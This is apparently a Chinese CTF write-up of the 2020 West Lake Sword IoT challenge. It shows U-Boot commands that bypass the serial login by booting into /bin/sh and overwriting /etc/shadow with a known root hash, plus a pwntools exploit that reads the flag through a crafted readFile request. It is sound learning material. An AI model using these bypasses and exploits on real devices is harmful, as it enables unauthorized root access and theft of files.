---
title: 西湖论剑 2020 IoT闯关赛 赛后整理
date: 2020-11-17 00:00:00
categories:
- IOT
tags: arm
---

> 本次IoT闯关赛为西湖论剑的其中一个赛项，由安恒的海特实验室出题，时长8小时，采用定制硬件为解题平台，玩法新颖，题目底座为linux5.4.75:libc2.30:armv5。但考察点偏CTF风格，与IoT安全实战尚有一定距离，最终赛况如下：

![image](https://xuanxuanblingbling.github.io/assets/pic/xihu/rank.png)

## 物料

闯关赛的题目需要烧写到一个板子上，也就是选手的胸卡：[【集赞福利】全球限量版“西湖论剑”IoT闯关赛神秘硬件！](https://mp.weixin.qq.com/s/igXkU0ZB6vlN_e0pdPvB6w)。这张胸卡的主控芯片为全志的F1C200s，留出了UART和OTA的接口，而且是直接使用micro USB接口，即UART转USB的功能已经做到板子上了，不需要TTL转接了。OTA接口在题目下的工作模式为USB网卡，可以直接给主机DHCP分配IP地址，板子的IP地址固定为`20.20.11.14`，故这俩USB直接接到主机上即可，UART用串口工具直接看，OTA是网卡。另外板子上还集成了ATmega328P，不过并明白他和主控是怎么一同使用的：

![image](https://xuanxuanblingbling.github.io/assets/pic/xihu/card.png)

另外还发了其他的一些东西：排线，杜邦线，转接板，USB-TTL转接器，USB-ISP下载器，DVB-T+FM+DAB电视棒，TF卡以及micro USB的连接线

![image](https://xuanxuanblingbling.github.io/assets/pic/xihu/stuff.png)

不过除了micro USB的连接线和电视棒，剩下的一概没用上。

## 密码绕过

使用串口工具连接板子，波特率115200，mac下可以自带工具：

```bash
➜  ls /dev | grep serial
cu.usbserial-02133E1A
tty.usbserial-02133E1A
➜  screen -L /dev/tty.usbserial-02133E1A  115200  -L
```

等题目启动完后，串口是有密码的：

```bash
Welcome to Hatlab BADGE200
badge200 login: root
Password: 
```

不过因为串口是没有禁止输入的，而且uboot是可以被中断的，故完全可以使用uboot绕过密码

### 方法

按reset重启，然后串口工具中快速按回车进入uboot命令行，然后输入如下两条命令，长的命令需要多次复制（不知道原因）

```uboot
=> setenv bootargs_common "console=ttyS0,115200 earlyprintk rootwait init=/bin/sh consoleblank=0 net.ifnames=0 biosdevname=0 rootfstype=jffs2"
=> boot
```

启动后进入没有题目的root shell，此时板子还没有ip地址，直接复制如下命令（全部复制），粘贴到shell里：

```bash
#!/bin/sh
mount proc /proc -t proc
set -- $(cat /proc/cmdline)
umount /proc
for x in "$@"; do
    case "$x" in
        overlayfsdev=*)
        OVERLAYFSDEV="${x#overlayfsdev=}"
        mtd erase /dev/mtd5
        mount -n -t jffs2 ${OVERLAYFSDEV} -o rw,noatime /overlay
        mkdir -p /overlay/rom/lower /overlay/rom/upper /overlay/rom/work
        mount -n -t overlay overlayfs:/overlay/rom -o rw,noatime,lowerdir=/,upperdir=/overlay/rom/upper,workdir=/overlay/rom/work /tmp
        mount --rbind /dev /tmp/dev/
        mount --rbind /overlay /tmp/overlay/
        mount --rbind / /tmp/overlay/rom/lower
        echo 'root:$1$NqxdI63c$nzvMkcJxzktGW6Tsgw3jb0:1::::::' > /tmp/etc/shadow
        exec chroot /tmp /sbin/init
        ;;
    esac
done
exec /sbin/init
```

然后用root:root应该就可以登录串口了，并且此时板子`20.20.11.14`应该已经可以ping通了，默认是开了ssh的，故也可以登录了

### 原理

uboot是启动linux内核前的引导，内核需要uboot提供参数才能正常启动，并且在uboot阶段，是有整个系统的完整控制权的，可以使用help命令列出uboot的功能：

```
=> help
?         - alias for 'help'
base      - print or set address offset
bdinfo    - print Board Info structure
blkcache  - block cache diagnostics and control
boot      - boot default, i.e., run 'bootcmd'
bootd     - boot default, i.e., run 'bootcmd'
bootelf   - Boot from an ELF image in memory
bootm     - boot application image from memory
bootvx    - Boot vxWorks from an ELF image
bootz     - boot Linux zImage image from memory
chpart    - change active partition
clrlogo   - fill the boot logo area with black
cmp       - memory compare
coninfo   - print console devices and information
cp        - memory copy
crc32     - checksum calculation
dfu       - Device Firmware Upgrade
dm        - Driver model low level access
echo      - echo args to console
editenv   - edit environment variable
env       - environment handling commands
erase     - erase FLASH memory
exit      - exit script
ext2load  - load binary file from a Ext2 filesystem
ext2ls    - list files in a directory (default /)
ext4load  - load binary file from a Ext4 filesystem
ext4ls    - list files in a directory (default /)
ext4size  - determine a file's size
false     - do nothing, unsuccessfully
fatinfo   - print information about filesystem
fatload   - load binary file from a dos filesystem
fatls     - list files in a directory (default /)
fatmkdir  - create a directory
fatrm     - delete a file
fatsize   - determine a file's size
fatwrite  - write file into a dos filesystem
fdt       - flattened device tree utility commands
flinfo    - print FLASH memory information
fstype    - Look up a filesystem type
go        - start application at address 'addr'
gpio      - query and control gpio pins
gpt       - GUID Partition Table
help      - print command description/usage
iminfo    - print header information for application image
imxtract  - extract a part of a multi-image
itest     - return true/false on integer compare
ln        - Create a symbolic link
load      - load binary file from a filesystem
loadb     - load binary file over serial line (kermit mode)
loads     - load S-Record file over serial line
loadx     - load binary file over serial line (xmodem mode)
loady     - load binary file over serial line (ymodem mode)
loop      - infinite loop on address range
ls        - list files in a directory (default /)
md        - memory display
mm        - memory modify (auto-incrementing address)
mmc       - MMC sub system
mmcinfo   - display MMC info
mtd       - MTD utils
mtdparts  - define flash/nand partitions
mw        - memory write (fill)
nm        - memory modify (constant address)
part      - disk partition related commands
printenv  - print environment variables
protect   - enable or disable FLASH write protection
random    - fill memory with random pattern
reset     - Perform RESET of the CPU
run       - run commands in an environment variable
save      - save file to a filesystem
setenv    - set environment variables
setexpr   - set environment variable as the result of eval expression
sf        - SPI flash sub-system
showvar   - print local hushshell variables
size      - determine a file's size
sleep     - delay execution for some time
source    - run script from memory
sysboot   - command to get and boot from syslinux files
test      - minimal test like /bin/sh
true      - do nothing, successfully
ums       - Use the UMS [USB Mass Storage]
usb       - USB sub-system
usbboot   - boot from USB device
version   - print monitor, compiler and linker version
```

故如果可以在`uboot`阶段拿到控制权，则可以有非常多的办法绕过之后启动的linux的权限认证。这里我们使用`init`变量来绕过，可以在`uboot`启动的时候观察环境变量，由于环境变量较多，有所过滤：

```bash
U-Boot 2020.07 (Nov 13 2020 - 15:01:11 +0800) Allwinner Technology

CPU:   Allwinner F Series (SUNIV)
Model: Allwinner F1C100s Generic Device
DRAM:  64 MiB
MMC:   mmc@1c0f000: 0, mmc@1c10000: 1
Setting up a 800x480 lcd console (overscan 0x0)
In:    serial
Out:   vga
Err:   vga
Allwinner mUSB OTG (Peripheral)
Hit any key to stop autoboot:  0
=> printenv bootargs_common
bootargs_common=console=ttyS0,115200 earlyprintk rootwait init=/preinit consoleblank=0 net.ifnames=0 biosdevname=0 rootfstype=jffs2
```

可见`init`变量设置为`/preinit`，这个玩意是啥，目前还不得而知，不过我们可以使用`setenv`的`uboot`命令，将`init`的值改为`/bin/sh`，然后使用`boot`命令，即可继续进行启动流程

```bash
=> setenv bootargs_common "console=ttyS0,115200 earlyprintk rootwait init=/bin/sh consoleblank=0 net.ifnames=0 biosdevname=0 rootfstype=jffs2"
=> boot
```
启动之后我们就拿到了一个root shell，但是发现此时板子的网络还不通，题目也没起起来，文件系统挂载的也没有很清晰：

```
/ # mount
mount: no /proc/mounts
/ # ls /proc
```

不过我们在根目录下看到了`preinit`这个文件，发现是个sh脚本：

```bash
$ cat preinit
#!/bin/sh
mount proc /proc -t proc
set -- $(cat /proc/cmdline)
umount /proc
for x in "$@"; do
    case "$x" in
        overlayfsdev=*)
        OVERLAYFSDEV="${x#overlayfsdev=}"
        mtd erase /dev/mtd5
        mount -n -t jffs2 ${OVERLAYFSDEV} -o rw,noatime /overlay
        mkdir -p /overlay/rom/lower /overlay/rom/upper /overlay/rom/work
        mount -n -t overlay overlayfs:/overlay/rom -o rw,noatime,lowerdir=/,upperdir=/overlay/rom/upper,workdir=/overlay/rom/work /tmp
        mount --rbind /dev /tmp/dev/
        mount --rbind /overlay /tmp/overlay/
        mount --rbind / /tmp/overlay/rom/lower
        exec chroot /tmp /sbin/init
        ;;
    esac
done
exec /sbin/init
```

看不太懂这个脚本，尤其是这个for循环：

```bash
mount proc /proc -t proc
set -- $(cat /proc/cmdline)
umount /proc
for x in "$@"; do
    case "$x" in
        overlayfsdev=*)
```

```bash
$ mount proc /proc -t proc
$ cat /proc/cmdline
console=ttyS0,115200 earlyprintk rootwait init=/bin/sh consoleblank=0 net.ifnames=0 biosdevname=0 rootfstype=jffs2 root=/dev/mtdblock3 overlayfsdev=/dev/mtdblock5
```

```bash
#!/bin/sh
mount proc /proc -t proc
set -- $(cat /proc/cmdline)
umount /proc
for x in "$@"; do
    case "$x" in
        overlayfsdev=*)
        OVERLAYFSDEV="${x#overlayfsdev=}"
        mtd erase /dev/mtd5
        mount -n -t jffs2 ${OVERLAYFSDEV} -o rw,noatime /overlay
        mkdir -p /overlay/rom/lower /overlay/rom/upper /overlay/rom/work
        mount -n -t overlay overlayfs:/overlay/rom -o rw,noatime,lowerdir=/,upperdir=/overlay/rom/upper,workdir=/overlay/rom/work /tmp
        mount --rbind /dev /tmp/dev/
        mount --rbind /overlay /tmp/overlay/
        mount --rbind / /tmp/overlay/rom/lower
        echo 'root:$1$NqxdI63c$nzvMkcJxzktGW6Tsgw3jb0:1::::::' > /tmp/etc/shadow
        exec chroot /tmp /sbin/init
        ;;
    esac
done
exec /sbin/init
```


## 热身赛

> 总共4道题，题目开在板子的80端口的网页上，为了让选手熟悉硬件操作流程

1. 手机改个蓝牙名字让板子搜索到
2. 串口回板子个数据
3. 把GPIO的电平拉低，短接
4. 登录提示用户名或密码错误，即用户名：或，密码：错误，登录即可

其中第三题GPIO给了提示，对于ATmega328P，GPIO是PC3，故找到芯片的datasheet，然后用镊子短接即可：

[Microcontrollers-ATmega328P_Datasheet.pdf](https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-7810-Automotive-Microcontrollers-ATmega328P_Datasheet.pdf)

![image](https://xuanxuanblingbling.github.io/assets/pic/xihu/gpio.png)


## 闯关赛

> 吐槽一下，就没在IoT设备上见过这么高版本的libc，居然是2.30

有两个Web和三个Pwn的附件：[IoT_attachment.zip](https://xuanxuanblingbling.github.io/assets/attachment/IoT_attachment.zip)

### babyboa

### messageBox

协议逆向，目标为使用`TCP:6780`端口的服务端程序，接受符合自定义协议的客户端请求，是真正的网络接口，而不是像大部分Pwn题：将标准输入输出映射到网络接口上。检查发现没去符号，难度系数低于实际设备的逆向分析：

```python
➜  file messageBox
messageBox: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 5.4.0, not stripped
➜  checksec messageBox
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

逆向过程较为简单，故略，协议格式为：

```python
# big endian
fixed string[6 byte] + length[2 byte] + func code[2 byte] + crc[4 byte] + func data
```

一开始卡在crc校验总是算不对，本地调试发现长度的两个字节如果有00直接就被截断了，导致后面的正文数据压根没进行校验，所以需要将长度填满到两个字节。预期解应该是各种绕过使用后面的命令执行读取flag，但可以使用readFile功能直接直接读flag。即本题没有用到内存破坏漏洞的利用方式，而是直接使用程序的功能完成利用，exp如下：

```python
from pwn import *
import zlib
context(log_level='debug',endian='big')
io = remote("20.20.11.14",6780)
payload = "readFile:"+"/"*0x100+"/workspace/flag"
crc = int(zlib.crc32(payload)& 0xffffffff)
io.send("H4bL1b"+p16(len(payload))+"\x01\x02"+p32(crc)+payload)
io.interactive()
```

### ezArmpwn

